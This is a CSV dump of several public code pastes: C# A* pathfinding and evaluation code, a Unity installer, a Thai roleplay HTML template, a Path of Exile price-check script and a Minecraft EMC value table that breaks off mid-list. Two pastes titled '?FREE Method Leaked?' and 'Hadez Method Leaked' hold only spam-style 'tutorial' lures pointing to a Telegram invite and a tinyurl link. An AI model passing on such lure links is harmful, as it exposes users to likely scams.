id,title,username,language,date,content
DfaNcKk7,Untitled,shahilsaha,C#,Tuesday 22nd of July 2025 01:00:23 PM CDT,"public class AStar : BasePathfinding
{
    protected override PathResult FindPath(Node start, Node goal, HashSet<Node> allowedNodes = null)
    {
        List<Node> openList = new List<Node>();
        HashSet<Node> closedList = new HashSet<Node>();

        openList.Add(start);
        start.gCost = 0; // Cost of the start node is 0
        start.hCost = HeuristicHelper.GetManhattanDistance(start, goal); // Heuristic cost from start to end
        start.fCost = start.gCost + start.hCost; // Total cost of the path from start to end

        // while there are nodes in the open list
        while (openList.Count > 0)
        {
            // Get the current Node with the lowest fCost
            Node currentNode = HeuristicHelper.FindLowestF(openList);

            // if the node is there in the open list, move it to the closed list
            if (openList.Contains(currentNode))
                openList.Remove(currentNode);

            closedList.Add(currentNode);

            // if the goal node is the current node, retrace the path and return it
            if (currentNode == goal)
            {
                var (path, totalCost) = HeuristicHelper.RetracePath(start, goal);
                return new PathResult
                {
                    Path = path,
                    PathLength = path.Count,
                    PathCost = totalCost,
                };
            }

            // Else, get all the neighbors of the current node
            var neighbors = currentNode.GetNeighbors();

            // Loop through each neighbor
            foreach (var neighbor in neighbors)
            {
                // If the neighbor is already in the closed list or is blocked, skip it
                if (closedList.Contains(neighbor) || !HeuristicHelper.IsNodeAllowed(neighbor, allowedNodes))
                    continue;

                // Gets the distance from the current node to the neighbor
                float tentativeGCost =
                    currentNode.gCost + HeuristicHelper.GetManhattanDistance(currentNode, neighbor);

                // calculate the cost of the path to the neighbor
                if (tentativeGCost < neighbor.gCost || !openList.Contains(neighbor))
                {
                    neighbor.gCost = tentativeGCost;
                    neighbor.hCost = HeuristicHelper.GetManhattanDistance(neighbor, goal);
                    neighbor.fCost = neighbor.gCost + neighbor.hCost;
                    neighbor.parent = currentNode;

                    // Add it to the open list if it is not already there
                    if (!openList.Contains(neighbor))
                        openList.Add(neighbor);
                }
            }
        }

        // No path was found, return null
        return null;
    }
}
"
bmpGjKJa,Untitled,shahilsaha,C#,Tuesday 22nd of July 2025 12:40:59 PM CDT,"public class PathfindingEvaluator : MonoBehaviour
{
    [SerializeField] private Grid3D mGrid;
    [SerializeField] private PathfindingManager mPathManager;
    private List<EvaluationResult> evaluationResults = new List<EvaluationResult>();

    public List<EvaluationResult> GetEvaluationResults() => evaluationResults;

    public EvaluationResult Evaluate(int evalSize)
    {
        // Pre evaluation
        if (evalSize <= 0)
        {
            Debug.LogError(""Evaluation size must be greater than 0."");
            return null;
        }

        // -- Clear data if exists.
        ClearResults();

        var nodes = mGrid.GetStartEndNodes();

        // Evaluate the algorithms
        StartEvaluation(evalSize, nodes.start, nodes.goal);

        // Post evaluation
        if (evaluationResults.Count <= 0) return null;

        return evaluationResults[evalSize - 1];
    }

    public void ClearResults()
    {
        if (evaluationResults != null && evaluationResults.Count > 0)
            evaluationResults.Clear();
    }

    private void StartEvaluation(int evalSize, Node start, Node goal)
    {
        int count = 0;

        while (count < evalSize)
        {
            var results = GatherEvaluationData(start, goal);
            evaluationResults.Add(results);
            count++;
        }
    }

    private EvaluationResult GatherEvaluationData(Node start, Node goal)
    {
        var aStar = EvaluationResult.FromPathResult(mPathManager.RunAStar(start, goal));
        var ilsWithAStar = EvaluationResult.FromPathResult(mPathManager.RunILSWithAStar(start, goal));
        var gbfs = EvaluationResult.FromPathResult(mPathManager.RunGBFS(start, goal));
        var ilsWithGBFS = EvaluationResult.FromPathResult(mPathManager.RunILSWithGBFS(start, goal));

        return new EvaluationResult
        {
            AStar = aStar,
            ILSWithAStar = ilsWithAStar,
            GBFS = gbfs,
            ILSWithGBFS = ilsWithGBFS,
        };
    }
}"
NsffjKU7,?FREE Method Leaked? 1Y,awilsonsys,Java,Tuesday 22nd of July 2025 12:33:23 PM CDT," 
>TUTORIAL BELOW<
https://t[dot]me/+NWWm5d4mfEAyZDQx

B32hvM
"
ZShUhe42,Hadez Method Leaked???? TC,awilsonsys,Java,Tuesday 22nd of July 2025 12:30:11 PM CDT," 
>TUTORIAL BELOW<
https://tinyurl.com/2u65sthr

oBcAxz
"
ky1McsBH,Blossom 03 - โรล,Kelly-B9978,HTML,Tuesday 22nd of July 2025 12:27:17 PM CDT,"<!--
[คู่มือการแก้ไขโคด] 
ตำแหน่งภาพ : เพิ่ม --olv-pos: 50% 50%; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - เลขตัวแรกคือการขยับซ้าย - ขวา โดย 0% = ชิดซ้าย 100% = ชิดขวา
 - เลขตัวแรกคือการขยับขึ้น - ลง โดย 0% = ชิดบน 100% = ชิดล่าง
 
ขนาดภาพ : เพิ่ม --olv-size: cover; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - cover คือ ขยายเต็มพื้นที่
 - 100% คือ ขนาดเดิมของรูป
 - มากกว่า 100% คือ ขนาดใหญ่ขึ้น
 - น้อยกว่า 100% คือ ขนาดเล็กลง
-->

<link href=""https://dl.dropbox.com/scl/fi/j05ok8um0jda9e1hb34su/blossom3.css?rlkey=vaksp9lwuwth3w96g9ziudjx8&st=zvtwfknt"" rel=""stylesheet"">
<div id=""Blossom3""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""olive-role"" class=""olive-box"">
<div class=""olive-leaf1""></div><div class=""olive-leaf2""></div>
<div class=""olive-title"">03 Blossom Rd.</div>
<div class=""olive-pic"" style=""--olv-pic: url(--ลิงก์รูป--);""></div>
<h1 class=""olive-name"">Josephine  <br>    Starling</h1>
<div class=""olive-content"">
--เนื้อหาโรลเพลย์--
<hr>
[b]หมายเหตุ[/b] หมายเหตุ
</div>
</div></div>

<link href=""https://dl.dropbox.com/scl/fi/j05ok8um0jda9e1hb34su/blossom3.css?rlkey=vaksp9lwuwth3w96g9ziudjx8&st=zvtwfknt"" rel=""stylesheet"">
<div id=""Blossom3""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""olive-role"" class=""olive-box"">
<div class=""olive-leaf1""></div><div class=""olive-leaf2""></div>
<div class=""olive-title"">03 Blossom Rd.</div>
<div class=""olive-pic"" style=""--olv-pic: url(--ลิงก์รูป--);""></div>
<h1 class=""olive-name"">Bellanie  <br>   Avendell</h1>
<div class=""olive-content"">
--เนื้อหาโรลเพลย์--
<hr>
[b]หมายเหตุ[/b] หมายเหตุ
</div>
</div></div>

<link href=""https://dl.dropbox.com/scl/fi/j05ok8um0jda9e1hb34su/blossom3.css?rlkey=vaksp9lwuwth3w96g9ziudjx8&st=zvtwfknt"" rel=""stylesheet"">
<div id=""Blossom3""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""olive-role"" class=""olive-box"">
<div class=""olive-leaf1""></div><div class=""olive-leaf2""></div>
<div class=""olive-title"">03 Blossom Rd.</div>
<div class=""olive-pic"" style=""--olv-pic: url(--ลิงก์รูป--);""></div>
<h1 class=""olive-name"">Desdemona</h1>
<div class=""olive-content"">
--เนื้อหาโรลเพลย์--
<hr>
[b]หมายเหตุ[/b] หมายเหตุ
</div>
</div></div>"
YtitgPZA,poe pricecheck,Old_Shinigami,JavaScript,Tuesday 22nd of July 2025 12:23:00 PM CDT,"var Currency = [
[""Rogue's Marker"",27],
[""Scroll of Wisdom"",100],
[""Portal Scroll"",250],
[""Orb of Transmutation"",400],
[""Wild Crystallised Lifeforce"",414],
[""Jeweller's Orb"",440],
[""Primal Crystallised Lifeforce"",488],
[""Vivid Crystallised Lifeforce"",500],
[""Lesser Eldritch Ichor"",800],
[""Orb of Alchemy"",1000],
[""Orb of Binding"",1100],
[""Blacksmith's Whetstone"",1250],
[""Chromatic Orb"",1300],
[""Engineer's Orb"",1430],
[""Orb of Chance"",1500],
[""Instilling Orb"",1667],
[""Orb of Augmentation"",1700],
[""Orb of Fusing"",1760],
[""Orb of Alteration"",2000],
[""Lesser Eldritch Ember"",2200],
[""Armourer's Scrap"",2500],
[""Orb of Horizons"",4000],
[""Orb of Unmaking"",4700],
[""Blessed Orb"",5000],
[""Vaal Orb"",5500],
[""Greater Eldritch Ichor"",6000],
[""Glassblower's Bauble"",6500],
[""Orb of Scouring"",7000],
[""Tainted Blacksmith's Whetstone"",7400],
[""Regal Orb"",8000],
[""Tainter Jeweller's Orb"",8500],
[""Cartographer's Chisel"",9000],
[""Chaos Orb"",10000],
[""Orb of Regret"",11250],
[""Tainted Armourer's Scrap"",15000],
[""Enkindling Orb"",16000],
[""Greater Eldritch Ember"",17000],
[""Gemcutter's Prism"",20000],
[""Tainted Chromatic Orb"",21000],
[""Harbinger's Orb"",27500],
[""Stacked Deck"",30000],
[""Grand Eldritch Ichor"",36000],
[""Orb of Annulment"",55000],
[""Tainted Mythic Orb"",66600],
[""Tainted Orb of Fusing"",70000],
[""Tainted Chaos Orb"",73300],
[""Ancient Orb"",80000],
[""Grand Eldritch Ember"",136700],
[""Exalted Orb"",200000],
[""Eldritch Exalted Orb"",310000],
[""Maven's Chisel of Scarabs"",320000],
[""Maven's Chisel of Procurement"",330000],
[""Maven's Chisel of Divination"",430000],
[""Sacred Orb"",450000],
[""Eldritch Orb of Annulment"",460000],
[""Velied Chaos Orb"",500000],
[""Eldritch Chaos Orb"",580000],
[""Maven's Chisel of Proliferation"",660000],
[""Maven's Chisel of Avarice"",1150000],
[""Sacred Crystallised Lifeforce"",1280000],
[""Tainted Exalted Orb"",1700000],
[""Divine Orb"",2050000],
[""Exceptional Eldritch Ichor"",2200000],
[""Tempering Orb"",2270000],
[""Exceptional Eldritch Ember"",2790000],
[""Redeemer's Exalted Orb"",4100000],
[""Orb of Conflict"",4300000],
[""Warlord's Exalted Orb"",4510000],
[""Tailoring Orb"",5130000],
[""Hunter's Exalted Orb"",6150000],
[""Crusader's Exalted Orb"",6970000],
[""Awakener's Orb"",9640000],
[""Fracturing Orb"",14350000],
[""Orb of Dominance"",15170000],
[""Tainted Divine Teardrop"",15370000],
[""Velied Exalted Orb"",61500000],
[""Reflecting Mist"",65600000],
[""Hinekora's Lock"",348500000],
[""Mirror of Kalandra"",2255000000]], priceRange = [
[1e3,1e4,3,0,9],
[1e4,1e5,10,0,32],
[1e5,1e6,25,0,46],
[1e6,1e7,56,0,57],
[1e7,1e8,87,10,71],
[1e8,1e9,102,33,76],
[3e9,1e10,109,47,78],
[1e10,1e11,112,58,78]];
var r = Math.floor(Math.random()*priceRange[priceRange.length-1][2]),tier = 0;
for (let i=0; i<priceRange.length-1; i++) if (r>=priceRange[i][2]) tier = i+1;
var curr = priceRange[tier][3]+Math.floor(Math.random()*(1+priceRange[tier][4]-priceRange[tier][3]));
var price = priceRange[tier][0]+Math.floor(Math.random()*(1+priceRange[tier][1]-priceRange[tier][0]));
price = Math.floor(price/Currency[curr][1]);
if (price>=1000) price = price.toString().split('').reverse().join('').replace(/(.{3})(?=.)/g,""$1."").split('').reverse().join('');
var s = price+""x ""+Currency[curr][0]; s"
HUS3XvXp,Untitled,Ethan_M,C#,Tuesday 22nd of July 2025 12:15:01 PM CDT,"using GamePlay;
using GamePlay.Entities;
using GamePlay.Factory;
using GamePlay.MapFeatures;
using Networking;
using Networking.Entities;
using UnityEngine;
using Reflex.Core;
using Services;
using UI;
namespace Infrastructure
{
	public class ProjectInstaller : MonoBehaviour, IInstaller
	{
		public void InstallBindings(ContainerBuilder containerBuilder)
		{
			containerBuilder.AddSingleton(typeof(AssetProvider), typeof(IAssetProvider));
			containerBuilder.AddSingleton(typeof(StaticDataService), typeof(IStaticDataService));
			containerBuilder.AddSingleton(typeof(JsonToFileStorageService), typeof(IStorageService));
			containerBuilder.AddSingleton(typeof(StandaloneInputService), typeof(IInputService));
			containerBuilder.AddSingleton(typeof(SceneLoader), typeof(SceneLoader));
			containerBuilder.AddSingleton(typeof(MapConfigureLoader), typeof(IMapConfigureLoader));
# if LOCAL_BUILD
			containerBuilder.AddSingleton(typeof(LocalAvatarLoader), typeof(IAvatarLoader));
#else
			containerBuilder.AddSingleton(typeof(SteamAvatarLoader), typeof(IAvatarLoader));
#endif
			BindFactories(containerBuilder);
		}

		private static void BindFactories(ContainerBuilder containerBuilder)
		{
			containerBuilder.AddSingleton(typeof(ParticleFactory), typeof(IParticleFactory));
			containerBuilder.AddSingleton(typeof(MeshFactory), typeof(IMeshFactory));
			containerBuilder.AddSingleton(typeof(UIFactory), typeof(IUIFactory));
			containerBuilder.AddSingleton(typeof(NetworkEntityFactory), typeof(IEntityFactory));
			containerBuilder.AddSingleton(typeof(InventoryFactory), typeof(IInventoryFactory));
			containerBuilder.AddSingleton(typeof(CharacterFactory), typeof(ICharacterFactory));
			containerBuilder.AddSingleton(typeof(NetworkingFactory), typeof(INetworkingFactory));
		}
	}
}"
A2XyZE9Y,emc_lookup.lua,Ramog,Lua,Tuesday 22nd of July 2025 11:40:06 AM CDT,"local lookuptableJson = [[
{
  ""minecraft:name_tag|0"": 192,
  ""quark:stained_planks_black_slab|0"": 4,
  ""minecraft:wooden_button|0"": 8,
  ""blockcraftery:editable_inner_corner_reinforced|0"": 24,
  ""quark:midori_block_stairs|0"": 6,
  ""quark:colored_flowerpot_green|0"": 56,
  ""ironchest:diamond_crystal_chest_upgrade|0"": 72,
  ""quark:stained_clay_tiles_pink_stairs|0"": 48,
  ""minecraft:deadbush|0"": 1,
  ""minecraft:apple|0"": 128,
  ""forestry:stairs.cocobolo|0"": 6,
  ""minecraft:observer|0"": 390,
  ""quark:end_bricks_wall|0"": 1,
  ""minecraft:iron_sword|0"": 516,
  ""ironchest:iron_shulker_box_purple|6"": 33353,
  ""ironchest:iron_shulker_box_purple|5"": 32849,
  ""ironchest:iron_shulker_box_purple|4"": 8260,
  ""ironchest:iron_shulker_box_purple|3"": 5184,
  ""ironchest:iron_shulker_box_purple|2"": 32841,
  ""ironchest:iron_shulker_box_purple|1"": 16456,
  ""ironchest:iron_shulker_box_purple|0"": 6208,
  ""quark:elder_prismarine_stairs|0"": 96,
  ""chisel:planks-oak|6"": 8,
  ""minecraft:wool|7"": 52,
  ""chisel:planks-oak|7"": 8,
  ""minecraft:wool|6"": 50,
  ""chisel:planks-oak|4"": 8,
  ""minecraft:wool|5"": 51,
  ""chisel:planks-oak|5"": 8,
  ""minecraft:wool|4"": 50,
  ""chisel:planks-oak|2"": 8,
  ""buildcrafttransport:pipe_iron_item|16"": 64,
  ""minecraft:wool|3"": 50,
  ""chisel:planks-oak|3"": 8,
  ""minecraft:wool|2"": 50,
  ""chisel:planks-oak|0"": 8,
  ""minecraft:wool|1"": 50,
  ""minecraft:rabbit_stew|0"": 198,
  ""chisel:planks-oak|1"": 8,
  ""minecraft:wool|0"": 48,
  ""chisel:planks-oak|14"": 8,
  ""minecraft:wool|15"": 50,
  ""minecraft:wool|14"": 50,
  ""chisel:planks-oak|12"": 8,
  ""minecraft:wool|13"": 49,
  ""chisel:planks-oak|13"": 8,
  ""minecraft:wool|12"": 64,
  ""chisel:planks-oak|10"": 8,
  ""minecraft:wool|11"": 156,
  ""chisel:planks-oak|11"": 8,
  ""minecraft:wool|10"": 103,
  ""chisel:planks-oak|8"": 8,
  ""minecraft:wool|9"": 102,
  ""chisel:planks-oak|9"": 8,
  ""minecraft:wool|8"": 50,
  ""buildcrafttransport:pipe_iron_item|4"": 64,
  ""buildcrafttransport:pipe_iron_item|5"": 64,
  ""buildcrafttransport:pipe_iron_item|6"": 64,
  ""buildcrafttransport:pipe_iron_item|7"": 64,
  ""extratrees:doors.yew|0"": 16,
  ""buildcrafttransport:pipe_iron_item|1"": 64,
  ""buildcrafttransport:pipe_iron_item|2"": 64,
  ""buildcrafttransport:pipe_iron_item|3"": 64,
  ""buildcrafttransport:pipe_iron_item|12"": 64,
  ""buildcrafttransport:pipe_iron_item|13"": 64,
  ""buildcrafttransport:pipe_iron_item|14"": 64,
  ""buildcrafttransport:pipe_iron_item|15"": 64,
  ""buildcrafttransport:pipe_iron_item|8"": 64,
  ""buildcrafttransport:pipe_iron_item|9"": 64,
  ""quark:midori_pillar|0"": 8,
  ""buildcrafttransport:pipe_iron_item|10"": 64,
  ""buildcrafttransport:pipe_iron_item|11"": 64,
  ""quark:birch_trapdoor|0"": 8,
  ""cathedral:cathedral_gargoyle_demon_quartz|0"": 4345,
  ""minecraft:iron_horse_armor|0"": 1584,
  ""projectred-exploration:stone_sickle|0"": 16,
  ""quark:vertical_stained_planks|7"": 8,
  ""quark:candle|15"": 72,
  ""quark:vertical_stained_planks|6"": 8,
  ""quark:candle|14"": 72,
  ""quark:vertical_stained_planks|5"": 8,
  ""quark:candle|13"": 71,
  ""quark:vertical_stained_planks|4"": 8,
  ""quark:candle|12"": 86,
  ""quark:vertical_stained_planks|3"": 8,
  ""quark:candle|11"": 178,
  ""quark:vertical_stained_planks|2"": 8,
  ""quark:candle|10"": 125,
  ""quark:vertical_stained_planks|1"": 8,
  ""quark:candle|9"": 124,
  ""quark:vertical_stained_planks|0"": 8,
  ""quark:candle|8"": 72,
  ""quark:vertical_stained_planks|15"": 8,
  ""extratrees:stairs.purpleheart|0"": 6,
  ""minecraft:light_weighted_pressure_plate|0"": 4096,
  ""quark:candle|7"": 74,
  ""quark:vertical_stained_planks|14"": 8,
  ""quark:candle|6"": 72,
  ""quark:vertical_stained_planks|13"": 8,
  ""quark:candle|5"": 73,
  ""quark:vertical_stained_planks|12"": 8,
  ""quark:candle|4"": 72,
  ""quark:vertical_stained_planks|11"": 8,
  ""quark:candle|3"": 72,
  ""quark:vertical_stained_planks|10"": 8,
  ""quark:candle|2"": 72,
  ""quark:vertical_stained_planks|9"": 8,
  ""quark:candle|1"": 72,
  ""quark:vertical_stained_planks|8"": 8,
  ""quark:candle|0"": 70,
  ""minecraft:purpur_stairs|0"": 144,
  ""ic2:itemcellempty|2"": 128,
  ""ic2:itemcellempty|0"": 64,
  ""ic2:itemcellempty|1"": 64,
  ""cathedral:cathedral_gargoyle_demon_basalt|0"": 253,
  ""buildcrafttransport:pipe_iron_power|16"": 128,
  ""quark:stained_clay_tiles_gray_slab|0"": 32,
  ""ic2:itemmisc|453"": 320,
  ""projectred-exploration:sapphire_axe|0"": 3080,
  ""mocreatures:deep_wyvstone|0"": 1,
  ""buildcrafttransport:pipe_iron_power|2"": 128,
  ""buildcrafttransport:pipe_iron_power|3"": 128,
  ""buildcrafttransport:pipe_iron_power|1"": 128,
  ""buildcrafttransport:pipe_iron_power|6"": 128,
  ""extratrees:fence.gates.box|0"": 32,
  ""buildcrafttransport:pipe_iron_power|7"": 128,
  ""buildcrafttransport:pipe_iron_power|4"": 128,
  ""buildcrafttransport:pipe_iron_power|5"": 128,
  ""buildcrafttransport:pipe_iron_power|10"": 128,
  ""buildcrafttransport:pipe_iron_power|11"": 128,
  ""buildcrafttransport:pipe_iron_power|8"": 128,
  ""buildcrafttransport:pipe_iron_power|9"": 128,
  ""buildcrafttransport:pipe_iron_power|14"": 128,
  ""buildcrafttransport:pipe_iron_power|15"": 128,
  ""chisel:basalt2|7"": 1,
  ""buildcrafttransport:pipe_iron_power|12"": 128,
  ""buildcrafttransport:pipe_iron_power|13"": 128,
  ""extratrees:doors.rowan|0"": 16,
  ""chisel:glassdyedwhite|5"": 1,
  ""chisel:glassdyedwhite|4"": 1,
  ""chisel:glassdyedwhite|3"": 1,
  ""chisel:glassdyedwhite|2"": 1,
  ""chisel:glassdyedwhite|1"": 1,
  ""chisel:glassdyedwhite|0"": 1,
  ""ic2:itemmisc|3"": 256,
  ""ic2:itemmisc|2"": 128,
  ""ic2:itemmisc|1"": 2048,
  ""ic2:itemmisc|0"": 256,
  ""ic2:itemmisc|5"": 512,
  ""ic2:itemmisc|4"": 160,
  ""quark:world_stone_pavement|5"": 1,
  ""quark:fire_stone_brick_wall|0"": 64,
  ""railcraft:pearlized_paver_stairs|0"": 96,
  ""quark:world_stone_pavement|2"": 16,
  ""minecraft:mossy_cobblestone|0"": 9,
  ""quark:world_stone_pavement|1"": 16,
  ""quark:stained_planks_cyan_stairs|0"": 6,
  ""quark:world_stone_pavement|0"": 16,
  ""forestry:leaves.decorative.0|14"": 1,
  ""forestry:leaves.decorative.1|15"": 1,
  ""forestry:leaves.decorative.0|15"": 1,
  ""forestry:leaves.decorative.1|14"": 1,
  ""forestry:leaves.decorative.0|12"": 1,
  ""forestry:leaves.decorative.1|13"": 1,
  ""forestry:leaves.decorative.0|13"": 1,
  ""forestry:leaves.decorative.1|12"": 1,
  ""forestry:leaves.decorative.0|10"": 1,
  ""forestry:leaves.decorative.1|11"": 1,
  ""forestry:leaves.decorative.0|11"": 1,
  ""forestry:leaves.decorative.1|10"": 1,
  ""quark:stained_planks_light_blue_stairs|0"": 6,
  ""forestry:leaves.decorative.0|8"": 1,
  ""forestry:leaves.decorative.1|9"": 1,
  ""quark:stained_clay_tiles_gray_stairs|0"": 48,
  ""forestry:leaves.decorative.0|9"": 1,
  ""forestry:leaves.decorative.1|8"": 1,
  ""forestry:leaves.decorative.0|6"": 1,
  ""forestry:leaves.decorative.1|7"": 1,
  ""forestry:leaves.decorative.0|7"": 1,
  ""forestry:leaves.decorative.1|6"": 1,
  ""forestry:leaves.decorative.0|4"": 1,
  ""forestry:leaves.decorative.1|5"": 1,
  ""forestry:leaves.decorative.0|5"": 1,
  ""forestry:leaves.decorative.1|4"": 1,
  ""forestry:leaves.decorative.0|2"": 1,
  ""forestry:leaves.decorative.1|3"": 1,
  ""forestry:leaves.decorative.0|3"": 1,
  ""forestry:leaves.decorative.1|2"": 1,
  ""forestry:leaves.decorative.0|0"": 1,
  ""forestry:leaves.decorative.1|1"": 1,
  ""forestry:leaves.decorative.0|1"": 1,
  ""forestry:leaves.decorative.1|0"": 1,
  ""buildcrafttransport:pipe_quartz_power|8"": 320,
  ""minecraft:golden_axe|0"": 6152,
  ""buildcrafttransport:pipe_quartz_power|9"": 320,
  ""buildcrafttransport:pipe_quartz_power|10"": 320,
  ""buildcrafttransport:pipe_quartz_power|11"": 320,
  ""buildcrafttransport:pipe_quartz_power|12"": 320,
  ""quark:roots_white_flower|0"": 24,
  ""buildcrafttransport:pipe_quartz_power|13"": 320,
  ""buildcrafttransport:pipe_quartz_power|14"": 320,
  ""buildcrafttransport:pipe_quartz_power|15"": 320,
  ""minecraft:dark_oak_door|0"": 16,
  ""buildcrafttransport:pipe_quartz_power|1"": 320,
  ""buildcrafttransport:pipe_quartz_power|2"": 320,
  ""buildcrafttransport:pipe_quartz_power|3"": 320,
  ""buildcrafttransport:pipe_quartz_power|4"": 320,
  ""buildcrafttransport:pipe_quartz_power|5"": 320,
  ""minecraft:cooked_beef|0"": 64,
  ""buildcrafttransport:pipe_quartz_power|6"": 320,
  ""buildcrafttransport:pipe_quartz_power|7"": 320,
  ""ic2:itemmisc|51"": 256,
  ""extratrees:doors.pinkivory|0"": 16,
  ""ic2:itemmisc|50"": 128,
  ""ic2:itemmisc|54"": 512,
  ""buildcrafttransport:pipe_quartz_power|16"": 320,
  ""quark:bark_oak_stairs|0"": 24,
  ""ironchest:gold_diamond_shulker_upgrade|0"": 18438,
  ""minecraft:clay_ball|0"": 16,
  ""chisel:stonebrick|10"": 1,
  ""chisel:stonebrick|11"": 1,
  ""chisel:stonebrick|8"": 1,
  ""chisel:stonebrick|9"": 1,
  ""chisel:stonebrick|14"": 1,
  ""chisel:stonebrick|15"": 1,
  ""chisel:stonebrick|12"": 1,
  ""chisel:stonebrick|13"": 1,
  ""chisel:stonebrick|2"": 1,
  ""chisel:stonebrick|3"": 1,
  ""chisel:stonebrick|0"": 1,
  ""chisel:stonebrick|1"": 1,
  ""chisel:stonebrick|6"": 1,
  ""chisel:stonebrick|7"": 1,
  ""chisel:stonebrick|4"": 1,
  ""chisel:stonebrick|5"": 1,
  ""extratrees:fence.gates.banana|0"": 32,
  ""blockcraftery:editable_pressure_plate_player_reinforced|0"": 41,
  ""botany:trowel_diamond|0"": 8197,
  ""forestry:stairs.papaya|0"": 6,
  ""quark:diorite_speleothem|0"": 8,
  ""buildcrafttransport:pipe_diamond_power|16"": 2112,
  ""buildcrafttransport:pipe_diamond_power|12"": 2112,
  ""buildcrafttransport:pipe_diamond_power|13"": 2112,
  ""buildcrafttransport:pipe_diamond_power|14"": 2112,
  ""buildcrafttransport:pipe_diamond_power|15"": 2112,
  ""buildcrafttransport:pipe_diamond_power|8"": 2112,
  ""buildcrafttransport:pipe_diamond_power|9"": 2112,
  ""buildcrafttransport:pipe_diamond_power|10"": 2112,
  ""minecraft:brown_mushroom|0"": 32,
  ""buildcrafttransport:pipe_diamond_power|11"": 2112,
  ""buildcrafttransport:pipe_diamond_power|4"": 2112,
  ""buildcrafttransport:pipe_diamond_power|5"": 2112,
  ""extratrees:stairs.fig|0"": 6,
  ""buildcrafttransport:pipe_diamond_power|6"": 2112,
  ""buildcrafttransport:pipe_diamond_power|7"": 2112,
  ""buildcrafttransport:pipe_diamond_power|1"": 2112,
  ""quark:bark_spruce_wall|0"": 32,
  ""buildcrafttransport:pipe_diamond_power|2"": 2112,
  ""buildcrafttransport:pipe_diamond_power|3"": 2112,
  ""minecraft:dark_oak_fence_gate|0"": 32,
  ""extratrees:stairs.fir|0"": 6,
  ""cathedral:basalt_stairs_checkered_normal|0"": 1,
  ""forestry:planks.0|1"": 8,
  ""forestry:planks.1|2"": 8,
  ""forestry:planks.0|0"": 8,
  ""forestry:planks.1|3"": 8,
  ""forestry:planks.0|3"": 8,
  ""forestry:planks.1|0"": 8,
  ""forestry:planks.0|2"": 8,
  ""forestry:planks.1|1"": 8,
  ""forestry:planks.0|5"": 8,
  ""forestry:planks.1|6"": 8,
  ""minecraft:iron_ingot|0"": 256,
  ""forestry:planks.0|4"": 8,
  ""forestry:planks.1|7"": 8,
  ""minecraft:tnt_minecart|0"": 2244,
  ""forestry:planks.0|7"": 8,
  ""forestry:planks.1|4"": 8,
  ""forestry:planks.0|6"": 8,
  ""forestry:planks.1|5"": 8,
  ""forestry:planks.0|9"": 8,
  ""forestry:planks.1|10"": 8,
  ""forestry:planks.0|8"": 8,
  ""forestry:planks.1|11"": 8,
  ""forestry:planks.0|11"": 8,
  ""forestry:planks.1|8"": 8,
  ""forestry:planks.0|10"": 8,
  ""forestry:planks.1|9"": 8,
  ""forestry:planks.0|13"": 8,
  ""forestry:planks.0|12"": 8,
  ""forestry:planks.0|15"": 8,
  ""forestry:planks.1|12"": 8,
  ""forestry:planks.0|14"": 8,
  ""buildcrafttransport:pipe_sandstone_power|16"": 65,
  ""minecraft:diamond_chestplate|0"": 65536,
  ""buildcrafttransport:pipe_sandstone_power|1"": 65,
  ""buildcrafttransport:pipe_sandstone_power|3"": 65,
  ""buildcrafttransport:pipe_sandstone_power|2"": 65,
  ""galacticraftcore:oil_canister_partial|1"": 2816,
  ""buildcrafttransport:pipe_sandstone_power|5"": 65,
  ""buildcrafttransport:pipe_sandstone_power|4"": 65,
  ""buildcrafttransport:pipe_sandstone_power|7"": 65,
  ""ic2:itemmisc|180"": 4096,
  ""buildcrafttransport:pipe_sandstone_power|6"": 65,
  ""buildcrafttransport:pipe_sandstone_power|9"": 65,
  ""buildcrafttransport:pipe_sandstone_power|8"": 65,
  ""buildcrafttransport:pipe_sandstone_power|11"": 65,
  ""buildcrafttransport:pipe_sandstone_power|10"": 65,
  ""minecraft:sandstone|0"": 4,
  ""buildcrafttransport:pipe_sandstone_power|13"": 65,
  ""minecraft:sandstone|1"": 4,
  ""buildcrafttransport:pipe_sandstone_power|12"": 65,
  ""minecraft:sandstone|2"": 4,
  ""buildcrafttransport:pipe_sandstone_power|15"": 65,
  ""buildcrafttransport:pipe_sandstone_power|14"": 65,
  ""forestry:stairs.mahoe|0"": 6,
  ""quark:granite_speleothem|0"": 8,
  ""projecte:fuel_block|1"": 18432,
  ""projecte:fuel_block|0"": 4608,
  ""projecte:fuel_block|2"": 73728,
  ""irontanks:diamond_obsidian_upgrade|0"": 8704,
  ""projectred-exploration:ruby_hoe|0"": 2056,
  ""minecraft:cooked_rabbit|0"": 64,
  ""projectred-exploration:sapphire_sword|0"": 2052,
  ""chisel:tyrian|0"": 8,
  ""minecraft:golden_rail|0"": 2059,
  ""minecraft:oak_stairs|0"": 6,
  ""minecraft:grass|0"": 1,
  ""quark:sandstone_wall|0"": 4,
  ""buildcrafttransport:pipe_wood_item|5"": 2,
  ""quark:blaze_lantern|0"": 9984,
  ""buildcrafttransport:pipe_wood_item|4"": 2,
  ""mocreatures:wyvstone_button|0"": 2,
  ""buildcrafttransport:pipe_wood_item|7"": 2,
  ""minecraft:birch_fence|0"": 13,
  ""buildcrafttransport:pipe_wood_item|6"": 2,
  ""buildcrafttransport:pipe_wood_item|1"": 2,
  ""forestry:fence.gates.mahogany|0"": 32,
  ""buildcrafttransport:pipe_wood_item|3"": 2,
  ""buildcrafttransport:pipe_wood_item|2"": 2,
  ""buildcrafttransport:pipe_wood_item|13"": 2,
  ""buildcrafttransport:pipe_wood_item|12"": 2,
  ""buildcrafttransport:pipe_wood_item|15"": 2,
  ""buildcrafttransport:pipe_wood_item|14"": 2,
  ""buildcrafttransport:pipe_wood_item|9"": 2,
  ""buildcrafttransport:pipe_wood_item|8"": 2,
  ""buildcrafttransport:pipe_wood_item|11"": 2,
  ""quark:reed_block|0"": 288,
  ""buildcrafttransport:pipe_wood_item|10"": 2,
  ""buildcrafttransport:pipe_wood_item|16"": 2,
  ""quark:stained_planks_light_blue_slab|0"": 4,
  ""quark:paper_wall_sakura|0"": 52,
  ""minecraft:lava_bucket|0"": 832,
  ""chisel:glassdyedcyan|3"": 1,
  ""chisel:glassdyedcyan|2"": 1,
  ""chisel:glassdyedcyan|1"": 1,
  ""chisel:glassdyedcyan|0"": 1,
  ""chisel:glassdyedcyan|5"": 1,
  ""chisel:glassdyedcyan|4"": 1,
  ""chisel:temple|0"": 55,
  ""projectred-exploration:sapphire_pickaxe|0"": 3080,
